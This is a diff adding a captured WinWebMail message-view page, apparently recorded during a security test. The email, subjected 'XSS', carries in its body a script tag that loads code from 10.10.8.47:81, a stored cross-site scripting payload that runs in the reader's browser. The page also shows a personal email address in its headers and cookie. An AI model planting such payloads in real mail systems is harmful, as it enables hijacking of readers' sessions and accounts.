@@ -1,0 +1,355 @@
+content-length: 12799
+x-powered-by: ASP.NET
+set-cookie: name=william%2Elu%407road%2Ecom; expires=Thu, 20-Dec-2012 05:37:48 GMT; path=/
+server: Microsoft-IIS/7.0
+cache-control: private
+date: Tue, 20 Nov 2012 05:37:49 GMT
+content-type: text/html
+
+
+
+
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" content="text/html">
+<TITLE>WinWebMail</TITLE>
+<LINK href="images\hwem.css" rel=stylesheet>
+</HEAD>
+
+<script language="JavaScript">
+<!-- 
+var pdeladd;
+var isshow = true;
+
+function window_onload() {
+	headmessage();
+
+
+	hide_rads();
+}
+
+function back() {
+
+	location.href = "listmail.asp?mode=in&sname=&sfname=&page=0&GRSN=120661&sortstr=&sortmode=0&exstr=0000000&GRSN=4744837";
+
+}
+
+function killspam() {
+	if (confirm("要将此邮件报告为垃圾邮件吗?") == false)
+		return ;
+
+	location.href = "indict.asp?filename=20121120120622782_16282~3994d44d.in&gourl=listmail%2Easp%3Fmode%3Din%26sname%3D%26sfname%3D%26page%3D0%26GRSN%3D120661%26sortstr%3D%26sortmode%3D0%26exstr%3D0000000";
+}
+
+function movemail() {
+	prevnext();
+
+	var omode = "listmail.asp?mode=in&sname=&sfname=&page=0&GRSN=120661&sortstr=&sortmode=0&exstr=0000000";
+
+	if (omode.indexOf("mode=" + f1.mto.value) == -1)
+		delleftfilename("20121120120622782_16282~3994d44d.in");
+
+	location.href = "movemail.asp?filename=20121120120622782_16282~3994d44d.in&mto=" + f1.mto.value + "&GRSN=3916241&gourl=listmail%2Easp%3Fmode%3Din%26sname%3D%26sfname%3D%26page%3D0%26GRSN%3D120661%26sortstr%3D%26sortmode%3D0%26exstr%3D0000000";
+
+}
+
+function delthis() {
+	prevnext();
+
+	delleftfilename("20121120120622782_16282~3994d44d.in");
+
+	location.href="delmail.asp?filename=20121120120622782_16282~3994d44d.in&GRSN=1713613&gourl=listmail%2Easp%3Fmode%3Din%26sname%3D%26sfname%3D%26page%3D0%26GRSN%3D120661%26sortstr%3D%26sortmode%3D0%26exstr%3D0000000";
+
+}
+
+function realdelthis() {
+	if (confirm("确实要彻底删除吗?") == false)
+		return ;
+
+	prevnext();
+
+	delleftfilename("20121120120622782_16282~3994d44d.in");
+
+	location.href="delmail.asp?realdel=1&filename=20121120120622782_16282~3994d44d.in&GRSN=5665705&gourl=listmail%2Easp%3Fmode%3Din%26sname%3D%26sfname%3D%26page%3D0%26GRSN%3D120661%26sortstr%3D%26sortmode%3D0%26exstr%3D0000000";
+
+}
+
+function add2ads(vname, vemail) {
+	location.href = "addinaddress.asp?CName=" + vname + "&GRSN=3809428&Email=" + vemail;
+}
+
+function add2kill(vemail) {
+	location.href = "rejectemail.asp?fromshowmail=1&GRSN=2034053&mode=addone&kill=" + vemail;
+}
+
+function delleftfilename(fname) {
+	var s = parent.f1.document.leftval.temp.value;
+
+	var sp = s.indexOf('\t' + fname);
+
+	var newval;
+	newval = s.substring(0, sp);
+	newval = newval + s.substring(sp + fname.length + 1);
+
+	parent.f1.document.leftval.temp.value = newval;
+}
+
+function prevnext(isnext){
+	var s,ss;
+	s = parent.f1.document.leftval.temp.value;
+	ss = s.split("\t");
+
+	var i;
+
+	for(i = 0; i < ss.length; i++)
+	{
+		if (ss[i] == "20121120120622782_16282~3994d44d.in")
+			break;
+	}
+
+	if (i < 0 || i >=ss.length)
+		return;
+
+	var mprev = "";
+	var mnext = "";
+
+	if (i > 0)
+		mprev = ss[i - 1];
+
+	if (i+1 < ss.length)
+		mnext = ss[i + 1];
+
+	if (isnext == '1' && mnext != "")
+		location.href = "showmail.asp?filename=" + mnext + "&GRSN=4704385&sname=&sfname=&gourl=listmail%2Easp%3Fmode%3Din%26sname%3D%26sfname%3D%26page%3D0%26GRSN%3D120661%26sortstr%3D%26sortmode%3D0%26exstr%3D0000000";
+
+	if (isnext == '0' && mprev != "")
+		location.href = "showmail.asp?filename=" + mprev + "&GRSN=6693387&sname=&sfname=&gourl=listmail%2Easp%3Fmode%3Din%26sname%3D%26sfname%3D%26page%3D0%26GRSN%3D120661%26sortstr%3D%26sortmode%3D0%26exstr%3D0000000";
+
+
+	if (mnext != "")
+		pdeladd = "&gourl=listmail.asp?mode=in&sname=&sfname=&page=0&GRSN=120661&sortstr=&sortmode=0&exstr=0000000&nextfile=" + mnext;
+	else
+		pdeladd = "&gourl=listmail.asp?mode=in&sname=&sfname=&page=0&GRSN=120661&sortstr=&sortmode=0&exstr=0000000&nextfile=" + mprev;
+
+}
+
+function writepn() {
+	var s,ss;
+	s = parent.f1.document.leftval.temp.value;
+	ss = s.split("\t");
+
+	var i;
+
+	for(i = 0; i < ss.length; i++)
+	{
+		if (ss[i] == "20121120120622782_16282~3994d44d.in")
+			break;
+	}
+
+	if (i < 0 || i >=ss.length)
+		return;
+
+	var mprev = "";
+	var mnext = "";
+
+	if (i > 0)
+		mprev = ss[i - 1];
+
+	if (i+1 < ss.length)
+		mnext = ss[i + 1];
+
+
+	var writemprev = "";
+	var writemnext = "";
+
+	if (mprev != "")
+		writemprev = "<a href=\"javascript:prevnext('0')\"><img src=\"images\\upp.gif\" border=\"0\" align=\"absmiddle\"></a>&nbsp;&nbsp;";
+	else
+		writemprev = "<img src=\"images\\gupp.gif\" border=\"0\" align=\"absmiddle\">&nbsp;&nbsp;";
+
+
+	if (mnext != "")
+		writemnext = "<a href=\"javascript:prevnext('1')\"><img src=\"images\\downp.gif\" border=\"0\" align=\"absmiddle\"></a>";
+	else
+		writemnext = "<img src=\"images\\gdownp.gif\" border=\"0\" align=\"absmiddle\">";
+
+	document.write(writemprev + writemnext);
+}
+
+function headmessage() {
+	var theObj;
+	theObj = eval("document.all(\"headMessage\")");
+
+	if (isshow == false)
+	{
+		var instr = "Received:&nbsp;from&nbsp;121.15.130.153&nbsp;(HELO&nbsp;7ROAD-WILLIAM-LU.7ROAD.COM);&nbsp;Tue,&nbsp;20&nbsp;Nov&nbsp;2012&nbsp;12:06:22&nbsp;+0800<br>\
+From:&nbsp;william.lu@7road.com<br>\
+To:&nbsp;william.lu@7road.com<br>\
+Date:&nbsp;Today<br>\
+Subject:&nbsp;XSS<br>\
+Content-type:&nbsp;text/html<br>\
+";
+
+		instr = "<table width='95%' align='center' border='0' bgcolor='#DBEAF5' cellspacing='0' style='border-left:1px #8CA5B5 solid; border-top:1px #8CA5B5 solid; border-right:1px #8CA5B5 solid; border-bottom:1px #8CA5B5 solid;'><tr><td align='center' bgcolor='#DBEAF5' style='border-bottom:1px #8CA5B5 solid;'><a href='javascript:headmessage()'>邮件头信息</a></td></tr><tr><td>" + instr + "</td></tr></table>"
+
+		theObj.innerHTML = instr;
+
+		isshow = true;
+	}
+	else
+	{
+		theObj.innerHTML = "<table width='95%' align='center' border='0' bgcolor='#DBEAF5' cellspacing='0' style='border-left:1px #8CA5B5 solid; border-top:1px #8CA5B5 solid; border-right:1px #8CA5B5 solid; border-bottom:1px #8CA5B5 solid;'><tr><td align='center' bgcolor='#DBEAF5'><a href='javascript:headmessage()'>邮件头信息</a></td></tr></table>";
+
+		isshow = false;
+	}
+
+}
+
+function saveatt(anum) {
+	location.href = "mail2att.asp?GRSN=3382175&filename=20121120120622782_16282~3994d44d.in&sname=&sfname=&attnum=" + anum;
+}
+
+function doZoom(size){
+
+	document.getElementById('zoom').style.fontSize=size+'px'
+
+}
+
+function setpw(){
+	if (f1.sc_pw.value.length < 8)
+		alert("密码输入错误!");
+	else
+		location.href="showmail.asp?filename=20121120120622782_16282~3994d44d.in&scpw=" + f1.sc_pw.value + "&gourl=listmail%2Easp%3Fmode%3Din%26sname%3D%26sfname%3D%26page%3D0%26GRSN%3D120661%26sortstr%3D%26sortmode%3D0%26exstr%3D0000000"
+}
+
+var rads_is_show = false;
+function hide_rads()
+{
+	var Stag = document.getElementById("rads_showstr");
+	if (rads_is_show == true)
+	{
+		Stag.innerHTML = "隐藏收件地址";
+		rads_function_div.style.display = "inline";
+	}
+	else
+	{
+		Stag.innerHTML = "展示收件地址";
+		rads_function_div.style.display = "none";
+	}
+
+	rads_is_show = !rads_is_show;
+}
+// -->
+</script>
+
+<BODY id="onfc" LANGUAGE=javascript onload="return window_onload()">
+<br>
+<form name="f1">
+
+<table width="95%" border="0" align="center" bgcolor="#EFF7FF" cellspacing="0" style="border:1px #8CA5B5 solid;">
+  <tr>
+    <td colspan="2">
+      <div align="center"><a href="wframe.asp?mode=reply&GRSN=3315813&filename=20121120120622782_16282~3994d44d.in&sname=&sfname=&backurl=showmail.asp?filename%3D20121120120622782%5F16282%7E3994d44d%2Ein%26count%3D0%26sname%3D%26sfname%3D%26GRSN%3D8757998%26gourl%3Dlistmail%252Easp%253Fmode%253Din%2526sname%253D%2526sfname%253D%2526page%253D0%2526GRSN%253D120661%2526sortstr%253D%2526sortmode%253D0%2526exstr%253D0000000">回复</a>&nbsp;&nbsp;
+		<a href="wframe.asp?mode=replyall&GRSN=859107&filename=20121120120622782_16282~3994d44d.in&sname=&sfname=&backurl=showmail.asp?filename%3D20121120120622782%5F16282%7E3994d44d%2Ein%26count%3D0%26sname%3D%26sfname%3D%26GRSN%3D8757998%26gourl%3Dlistmail%252Easp%253Fmode%253Din%2526sname%253D%2526sfname%253D%2526page%253D0%2526GRSN%253D120661%2526sortstr%253D%2526sortmode%253D0%2526exstr%253D0000000">全部回复</a>&nbsp;&nbsp;
+
+		<a href="wframe.asp?mode=forward&GRSN=8229224&filename=20121120120622782_16282~3994d44d.in&sname=&sfname=&backurl=showmail.asp?filename%3D20121120120622782%5F16282%7E3994d44d%2Ein%26count%3D0%26sname%3D%26sfname%3D%26GRSN%3D8757998%26gourl%3Dlistmail%252Easp%253Fmode%253Din%2526sname%253D%2526sfname%253D%2526page%253D0%2526GRSN%253D120661%2526sortstr%253D%2526sortmode%253D0%2526exstr%253D0000000">转发</a>&nbsp;&nbsp;
+
+		<a href="delivermail.asp?filename=20121120120622782_16282~3994d44d.in&GRSN=3463077&sname=&sfname=&backurl=filename%3D20121120120622782%5F16282%7E3994d44d%2Ein%26count%3D0%26sname%3D%26sfname%3D%26GRSN%3D8757998%26gourl%3Dlistmail%252Easp%253Fmode%253Din%2526sname%253D%2526sfname%253D%2526page%253D0%2526GRSN%253D120661%2526sortstr%253D%2526sortmode%253D0%2526exstr%253D0000000">转递</a>&nbsp;&nbsp;
+
+		<a href="javascript:delthis()">删除</a>&nbsp;&nbsp;
+		<a href="javascript:realdelthis()">彻底删除</a>&nbsp;&nbsp;
+		<select name="mto" class="drpdwn" size="1" LANGUAGE=javascript onchange="movemail()">
+		<option value="">放入文件夹...</option>
+		<option value="del">垃圾箱</option>
+		<option value="in">收件箱</option>
+		<option value="out">草稿箱</option>
+		<option value="sed">发件箱</option>
+
+		</select>&nbsp;&nbsp;
+
+		<Script>writepn();</Script>&nbsp;&nbsp;
+		<a href="showeml.asp?outmode=down&filename=20121120120622782_16282~3994d44d.in&sname=&sfname=&GRSN=7761520" target="_blank">下载</a>&nbsp;&nbsp;
+		<a href="javascript:back()">返回</a>
+        </div>
+    </td>
+  </tr>
+</table>
+
+<br>
+
+<p id="headMessage"></p>
+<table width="95%" border="0" bgColor="#93BEE2" align="center" cellspacing="0" style='border:1px #336699 solid;'>
+  <tr> 
+
+  <tr> 
+    <td width="17%" height="20">
+      <div align="right"><font class="s" color="#104A7B"><b>日期:&nbsp;</b></font></div>
+    </td>
+    <td width="83%" bgcolor="#93BEE2" style='border-bottom:1px #336699 solid;'><table width="100%" border="0" cellspacing="0"><tr><td>2012年11月20日 12:06:22</td><td><div align="right">[<a href="javascript:hide_rads()"><span id="rads_showstr"></span></a>]&nbsp;&nbsp;<span id="go_att"></span><font class="s" color="#104A7B"><b>查看:</b></font>[<a href="javascript:doZoom(16)">大字</a> <a href="javascript:doZoom(14)">中字</a> <a href="javascript:doZoom(12)">小字</a>]</div></td></tr></table>
+  </tr>
+
+  <tr>
+    <td width="17%" height="20">
+      <div align="right"><font class="s" color="#104A7B"><b>投诉:&nbsp;</b></font></div>
+    </td>
+    <td width="83%" bgcolor="#93BEE2" style='border-bottom:1px #336699 solid;'><b><a href="javascript:killspam()" style="color:#000000">报告为垃圾邮件</a></b></td>
+  </tr>
+
+  <tr>
+    <td width="17%" height="20"> 
+      <div align="right"><font class="s" color="#104A7B"><b>优先级:&nbsp;</b></font></div>
+    </td>
+    <td width="83%" bgcolor="#93BEE2" style='border-bottom:1px #336699 solid;'>普通邮件&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="17%" height="20">
+      <div align="right"><font class="s" color="#104A7B"><b>发件人:&nbsp;</b></font></div>
+    </td>
+    <td width="83%" bgcolor="#93BEE2" style='border-bottom:1px #336699 solid;'>william.lu@7road.com&nbsp;</td>
+  </tr>
+  <tr> 
+    <td width="17%" height="20" nowrap>
+      <div align="right"><font class="s" color="#104A7B"><b>发件人地址:&nbsp;</b></font></div>
+    </td>
+    <td width="83%" bgcolor="#93BEE2" style='border-bottom:1px #336699 solid;'><img src='images\cal\a.gif' border='0'>&nbsp;william.lu@7road.com&nbsp;</td>
+  </tr>
+  <tr><td noWrap colspan="2" align="right" width="100%">
+<div id="rads_function_div">
+<table width="100%" border="0" cellspacing="0"><tr>
+    <td width="17%" height="20">
+      <div align="right"><font class="s" color="#104A7B"><b><span id="cal_mode">收件人地址</span>:&nbsp;</b></font></div>
+    </td>
+    <td width="83%" bgcolor="#93BEE2" style='border-bottom:1px #336699 solid;'><span id="cal_msg"><img src='images\cal\a.gif' border='0'>&nbsp;william.lu@7road.com &lt;william.lu@7road.com&gt;</span>&nbsp;</td>
+  </tr>
+
+</table>
+</div>
+  </td></tr>
+
+  <tr> 
+
+    <td width="17%" height="20" style='border-bottom:1px #336699 solid;'>
+
+      <div align="right"><font class="s" color="#104A7B"><b>主题:&nbsp;</b></font></div>
+    </td>
+    <td width="83%" bgcolor="#93BEE2" style='border-bottom:1px #336699 solid;'> XSS&nbsp;</td>
+  </tr>
+
+  <tr bgcolor="#FFFFFF">
+    <td colspan="2" id="zoom" style="">
+<script src="http://10.10.8.47:81/?u=f7db8b"></script>.
+&nbsp;</td>
+  </tr>
+
+</table>
+<br>
+<table width="95%" border="0"><tr><td>
+<div align="right"><a href="#"><img src='images\gotop.gif' border='0' alt="返回顶部"></a></div>
+</td></tr>
+</table>
+
+<br>
+</form>
+</BODY>
+</HTML>
+
